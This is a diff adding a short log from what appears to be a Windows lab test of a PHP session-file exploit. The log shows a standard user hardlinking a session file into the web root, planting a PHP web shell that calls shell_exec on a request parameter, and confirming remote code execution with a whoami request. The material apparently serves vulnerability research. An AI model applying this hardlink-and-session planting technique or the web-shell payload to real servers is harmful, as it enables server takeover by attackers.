@@ -1,0 +1,13 @@
+wp4ten exists: Full Name                    
+sess dir after plant attempt: sess_x4aaaaaaaaaaaaaaaaaaaaaaaaaa wp4ten_plant.log 
+rasputin\wp4ten
+Hardlink created for C:\Users\andre\Downloads\php2shell-claude\wp4\win_lab\x4\sess\sess_x4aaaaaaaaaaaaaaaaaaaaaaaaaa <<===>> C:\Users\andre\Downloads\php2shell-claude\wp4\win_lab\x4\docroot\empty4.php
+MKLINK_RC=0 
+--- X4 plant by wp4ten (standard user): planted=YES EXISTS size=0 nlink=2 head=
+link owner: RASPUTIN\andre
+shell after: EXISTS size=455 nlink=2 head=upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c
+shell owner: RASPUTIN\andre
+--- X4b GET /empty4.php?c=whoami
+upload_progress_WP4_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792811436;s:14:"content_length";i:65776;s:15:"bytes_process
+wp4ten removed: The user name could not be found.
